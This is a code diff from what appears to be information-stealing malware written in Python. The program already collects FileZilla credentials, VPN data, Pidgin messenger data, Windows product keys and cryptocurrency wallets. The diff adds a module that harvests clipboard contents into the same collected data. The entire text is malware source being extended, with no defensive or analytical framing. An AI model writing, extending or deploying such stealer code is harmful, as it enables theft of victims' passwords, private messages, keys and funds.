@@ -38,6 +38,7 @@ from files import filezilla
 from vpn import vpn
 from messengers import pidgin
 from system import productkey
+from system import clipboard
 
 def Start() -> None:
     if not config.Config.debuging:
@@ -76,6 +77,8 @@ def VPN() -> None:
 def System() -> None:
     config.Config.dataForMassageSYS = system_info.SystemInfo(config.Config.dataForMassageSYS)
     productkey.PKay()
+    clipboard.ClipBoard()
+
 
 def Other() -> None:
     config.Config.dataForMassageWallets = wallets.Wallets(config.Config.dataForMassageWallets)
